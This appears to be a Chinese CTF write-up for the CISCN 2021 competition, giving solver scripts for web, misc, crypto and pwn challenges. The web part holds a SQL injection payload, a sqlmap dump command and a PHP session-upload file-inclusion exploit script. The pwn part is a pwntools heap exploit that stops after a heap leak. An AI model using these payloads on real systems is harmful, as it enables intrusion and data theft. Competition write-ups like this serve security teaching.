# 第十四届全国大学的信息安全竞赛-WriteUp

> 原文: https://www.ctfiot.com/1926.html
> ID: 1926

WEB

admin') and updatexml(0,concat(0x7e,mid((select * from(select * from flag a join (select * from flag)b using(id,no))c),1,50)),0);#

sqlmap -r sql1.txt -D security -T flag -C "4719c5f3-13d7-49c8-923a-55e270da4b73" --dump

import ioimport sysimport requestsimport threading
from requests.models import Response
sessid = 'wa1ki0g'
def POST(session): while True: f = io.BytesIO(b'a' * 1024 * 50) session.post( 'http://124.70.105.172:23077/', data={"PHP_SESSION_UPLOAD_PROGRESS":'<?php var_dump(scandir("/etc"));?>'}, files={"file":('q.txt', f)}, cookies={'PHPSESSID':sessid} )
def READ(session): while True: url="http://124.70.105.172:23077/" data1={ 'cf':f'../../../../../../../../../var/lib/php/sessions/fefcieaibf/sess_{sessid}' } response = session.post(url=url,data=data1) if 'passwd' not in response.text: print('llllll') else: print(response.text) sys.exit(0)
with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start()
 READ(session)

图片马的最后记得加上#define width 1#define height 1

Misc

from PIL import Image,ImageDrawfor i in range(0,382): dcy = Image.open('./{i}.bmp').convert("RGB") for p in range(0, dcy.size[0]): for q in range(0, dcy.size[1]): n = dcy.getpixel((p,q)) if n == (233,233,233): dcy.putpixel((q,p), 0) dcy.save('{i}__.bmp') # dcy.show()

syntax = "proto3";message PBResponse {int32 code = 1;int64 flag_part_convert_to_hex_plz = 2;message data {string junk_data = 2;string flag_part = 1;}repeated data dataList = 3;int32 flag_part_plz_convert_to_hex = 4;string flag_last_part = 5;}

import pb2secret=open('secret','rb').read()test=pb2.PBResponse()test.ParseFromString(secret)print(test)

code: 200flag_part_convert_to_hex_plz: 15100450dataList { flag_part: "e2345" junk_data: "7af2c"}dataList { flag_part: "7889b0" junk_data: "82bc0"}flag_part_plz_convert_to_hex: 16453958flag_last_part: "d172a38dc"

Crypto

| classic

解题思路

找到个软件 没用过。。。有兴趣试一下

ADFGX解密但是需要密钥

http://www.atoolbox.net/Tool.php?Id=918找到个在线的，不知道密钥和关键字在哪

傻逼题目 密文倒置 密钥 classic

解出flag ，我呸

| rsa

解题思路

‍‍‍‍‍前面两关送分 小指数和共模，直接套脚本就可

第三关是p高位泄露，不太会，万幸的是在百度上找到了sage脚本

Link:RSA | Lazzaro (lazzzaro.github.io)

求出明文拼接然后交md5就行了

这里有一个坑 要用python2求出来的md5才对 ‍‍‍‍‍

# -*- coding: utf-8 -*-"""Created on Sat May 15 21:10:55 2021 @author: admin"""#共模from Crypto.Util.number import *import gmpy2def ext_euclid(a, b): if b == 0: return 1, 0, a else: x, y, q = ext_euclid(b, a % b) # q = gcd(a, b) = gcd(b, a%b) x, y = y, (x - (a // b) * y) return x, y, qc1=54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610c2=91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950e1=17n1=111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977e2=65537n=111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977 x,y,z = ext_euclid(e1, e2)if x < 0: x*=-1 c1 = gmpy2.invert(c1, n)if y < 0: y*=-1 c2 = gmpy2.invert(c2, n)m = (pow(c1,x,n)*pow(c2,y,n))%nprint(long_to_bytes(m)) 小指数：from gmpy2 import irootimport libnum c = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893e= 3n = 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009 k = 0 while 1: res=iroot(c+k*n,e) if(res[1]==True): print(libnum.n2s(int(res[0]))) break k=k+1 p高位泄露：#Sagen = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147e = 65537c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646 pbar = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902 << 200 kbits = 200print("upper %d bits (of %d bits) is given" % (pbar.nbits()-kbits, pbar.nbits()))PR.<x> = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root < 2^kbits with factor >= n^0.4p = x0 + pbarprint("p:", p)q = n // int(p)d = inverse_mod(e, (p-1)*(q-1))print("m:", pow(c, d, n))

# -*- coding: utf-8 -*-"""Created on Sun May 16 10:37:30 2021
@author: admin"""s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)
inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)

def sub_bytes(s): for i in range(4): for j in range(4): s[i][j] = s_box[s[i][j]]

def inv_sub_bytes(s): for i in range(4): for j in range(4): s[i][j] = inv_s_box[s[i][j]]

def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]

def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]
def add_round_key(s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j]

# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)

def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)

def mix_columns(s): for i in range(4): mix_single_column(s[i])

def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v
 mix_columns(s)

r_con = ( 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,)

def bytes2matrix(text): """ Converts a 16-byte array into a 4x4 matrix. """ return [list(text[i:i+4]) for i in range(0, len(text), 4)]
def matrix2bytes(matrix): """ Converts a 4x4 matrix into a 16-byte array. """ return bytes(sum(matrix, []))
def xor_bytes(a, b): """ Returns a new byte array with the elements xor'ed. """ return bytes(i^j for i, j in zip(a, b))
def inc_bytes(a): """ Returns a new byte array with the value increment by 1 """ out = list(a) for i in reversed(range(len(out))): if out[i] == 0xFF: out[i] = 0 else: out[i] += 1 break return bytes(out)
def pad(plaintext): """ Pads the given plaintext with PKCS#7 padding to a multiple of 16 bytes. Note that if the plaintext size is a multiple of 16, a whole block will be added. """ padding_len = 16 - (len(plaintext) % 16) padding = bytes([padding_len] * padding_len) return plaintext + padding
def unpad(plaintext): """ Removes a PKCS#7 padding, returning the unpadded text and ensuring the padding was correct. """ padding_len = plaintext[-1] assert padding_len > 0 message, padding = plaintext[:-padding_len], plaintext[-padding_len:] assert all(p == padding_len for p in padding) return message
def split_blocks(message, block_size=16, require_padding=True): assert len(message) % block_size == 0 or not require_padding return [message[i:i+16] for i in range(0, len(message), block_size)]

class AES: """ Class for AES-128 encryption with CBC mode and PKCS#7. This is a raw implementation of AES, without key stretching or IV management. Unless you need that, please use `encrypt` and `decrypt`. """ rounds_by_key_size = {16: 10, 24: 12, 32: 14} def __init__(self, master_key): """ Initializes the object with a given key. """ assert len(master_key) in AES.rounds_by_key_size self.n_rounds = AES.rounds_by_key_size[len(master_key)] self._key_matrices = self._expand_key(master_key)
 def _expand_key(self, master_key): """ Expands and returns a list of key matrices for the given master_key. """ # Initialize round keys with raw key material. key_columns = bytes2matrix(master_key) iteration_size = len(master_key) // 4
 # Each iteration has exactly as many columns as the key material. columns_per_iteration = len(key_columns) i = 1 while len(key_columns) < (self.n_rounds + 1) * 4: # Copy previous word. word = list(key_columns[-1])
 # Perform schedule_core once every "row". if len(key_columns) % iteration_size == 0: # Circular shift. word.append(word.pop(0)) # Map to S-BOX. word = [s_box[b] for b in word] # XOR with first byte of R-CON, since the others bytes of R-CON are 0. word[0] ^= r_con[i] i += 1 elif len(master_key) == 32 and len(key_columns) % iteration_size == 4: # Run word through S-box in the fourth iteration when using a # 256-bit key. word = [s_box[b] for b in word]
 # XOR with equivalent word from previous iteration. word = xor_bytes(word, key_columns[-iteration_size]) key_columns.append(word)
 # Group key words in 4x4 byte matrices. return [key_columns[4*i : 4*(i+1)] for i in range(len(key_columns) // 4)]
 def encrypt_block(self, plaintext): """ Encrypts a single block of 16 byte long plaintext. """ assert len(plaintext) == 16
 plain_state = bytes2matrix(plaintext)
 add_round_key(plain_state, self._key_matrices[0])
 for i in range(1, self.n_rounds): sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i])
 sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1])
 return matrix2bytes(plain_state)
 def encrypt_block_(self, plaintext,bytee): """ Encrypts a single block of 16 byte long plaintext. """ assert len(plaintext) == 16
 plain_state = bytes2matrix(plaintext)
 add_round_key(plain_state, self._key_matrices[0])
 for i in range(1, self.n_rounds): if i==8: plain_state[0][0] ^= bytee sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i])
 sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) keym = self._key_matrices[-1] return matrix2bytes(plain_state),keym[0]+keym[1]+keym[2]+keym[3]

import os,hashlib,random 
f = open('keys-0.csv','r') 
plain = os.urandom(16) m1 = '973f5ae78bc933a8fc7f7ab98d53d16f' m2 = '628aab012199cdab83cc1aa72204ea98's = random.randint(0,255)
for i in range(4266): key = f.readline().replace('n','') cipher,k = AES(bytes.fromhex(key)).encrypt_block_(plain,s) piece1 = [k[0],k[1],k[4],k[7],k[10],k[11],k[13],k[14]] m11 = hashlib.md5(bytes(piece1)).hexdigest() piece2 = [k[2],k[3],k[5],k[6],k[8],k[9],k[12],k[15]] m22 = hashlib.md5(bytes(piece2)).hexdigest() if m11 == m1 and m22 == m2: print(key) print("CISCN{"+hashlib.md5(bytes.fromhex(key)).hexdigest()+"}") bre

"""python"""from Crypto.Util.number import*from gmpy2 import*
n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809c = (6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028)x = -26279444166664821795077701675621823220865336004430428203703688888211697122228y = -22131877391133483964429946329193825460775374851078084751208971056041193500203
k = e*x-n*yK = k//ydef factor(K,N): l = 0 r = K for i in range(518): s = (l+r)//2 v = s*s - (9*s*s*(K-1-s)*(K-1-s)//(round(N**0.25)*round(N**0.25))) if v < 4*N: l = s else : r = s return rS = factor(K,n)d = inverse(e,n+1+S)print(d)
def add(p1, p2): if p1 == (0, 0): return p2 if p2 == (0, 0): return p1 if p1[0] == p2[0] and (p1[1] != p2[1] or p1[1] == 0): return (0, 0) if p1[0] == p2[0]: tmp = (3 * p1[0] * p1[0]) * inverse(2 * p1[1], n) % n else: tmp = (p2[1] - p1[1]) * inverse(p2[0] - p1[0], n) % n x = (tmp * tmp - p1[0] - p2[0]) % n y = (tmp * (p1[0] - x) - p1[1]) % n return (int(x), int(y))

def mul(n, p): r = (0, 0) tmp = p while 0 < n: if n & 1 == 1: r = add(r, tmp) n, tmp = n >> 1, add(tmp, tmp) return rm = mul(d,c)print(long_to_bytes(m[0])+long_to_bytes(m[1]))"""sage"""n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809M = matrix(ZZ,[[2**512,e],[0,-n]])GV = M.LLL()[0]x = GV[0]>>512y=(e*x-GV[1])//nprint(x)print(y)

from math import ceil, floorimport numpy as npimport matplotlib.pyplot as pltimport md5
list1 = [205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]list2 = [131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]list3 = [198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]
def gen(x,r): return round(r*x*(3-x),6)
def check_x0_r(b,r,lis): b = round(b,6) r = round(r,1) for i in range(len(lis)): b = gen(b,r) if int(b*22000) != lis[i]: return False return True
def get_r(lis): r = 0 for i in range(len(lis)-1): r += lis[i+1]/(lis[i]*(3-lis[i])) return r/(len(lis)-1)
def check(key1,key2): global list1,list2 chs = [] for i in range(len(list1)): if (list1[i]^key1)&0xff == list2[i]: chs.append(0) continue if (~list1[i]^key1)&0xff == list2[i]: chs.append(1) continue if (list1[i]^key2)&0xff == list2[i]: chs.append(2) continue if (~list1[i]^key2)&0xff == list2[i]: chs.append(3) continue return False ixlist = [] x = 0 for i in range(len(chs)): x = x*4+chs[i] if i%8==7: ixlist.append(x) x = 0 tlist = [x/22000 for x in ixlist] x1 = [] y1 = [] for i in range(len(tlist)-1): y1.append(tlist[i+1]) x1.append(tlist[i]) # # print(get_r(tlist)) r = get_r(tlist) print(r) # for i in range(1000000): # x0 = i/1000000 # if check_x0_r(x0,r,ixlist): # print(x0) xx = np.array(x1) yy = np.array(y1) plot1 = plt.plot(xx, yy, 's',label='original values') plt.show() return True
for key1 in range(256): for key2 in range(256): if check(key1,key2): print(key1,key2)

def check123(key1,key2): global list1,list2 chs = [] for i in range(len(list1)): if (list1[i]^key1)&0xff == list2[i]: chs.append(0) continue if (~list1[i]^key1)&0xff == list2[i]: chs.append(1) continue if (list1[i]^key2)&0xff == list2[i]: chs.append(2) continue if (~list1[i]^key2)&0xff == list2[i]: chs.append(3) continue ixlist = [] x = 0 for i in range(len(chs)): x = x*4+chs[i] if i%8==7: ixlist.append(x) x = 0 # r = get_r(ixlist) r = 1.2 for i in range(1000000): x0 = i/1000000 if check_x0_r(x0,r,ixlist): print(x0)
key1,key2 = 169,78# check123(key1,key2)
r = 1.2x0 = 0.840264
def generate(x): return round(r*x*(3-x),6)
def encrypt(pixel,key1,key2,x0,m,n): num = int(m*n/8) seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) < 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&0xff if ch == 1: pix = (~pix^key1)&0xff if ch == 2: pix = (pix^key2)&0xff if ch == 3: pix = (~pix^key2)&0xff cipher[index] = pix return cipher
def decrypt(pixel,key1,key2,x0,m,n): num = int(m*n/8) seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) < 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&0xff if ch == 1: pix = (~(pix^key1))&0xff if ch == 2: pix = (pix^key2)&0xff if ch == 3: pix = (~(pix^key2))&0xff cipher[index] = pix return cipher
image = encrypt(list3,key1,key2,x0,24,16)print(image)data = ''.join(map(chr,image))print(md5.new(data).hexdigest())

Pwn

#coding=utf-8from pwn import *context.log_level='debug'7
def choose(choice): p.recvuntil('Your choice: ') p.sendline(str(choice))def allocate(index,size): choose(1) p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size))
def edit(index,content): choose(2) p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') p.sendline(str(content))
def show(index): choose(3) p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') leak_addr=u64(p.recv(6).ljust(8,'x00')) return leak_addr
def delete(index): choose(4) p.recvuntil('Index: ') p.sendline(str(index))
p=process('./lonelywolf')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')allocate(0,0x78)for i in range(7): #free(): double free detected in tcache 2 edit(0,0x10*'a') delete(0)heap_leak_addr=show(0)print heap_leak_addrprint type(heap_leak_addr)heap_base=heap_leak_addr-0x260print hex(heap_base) #tcache_full
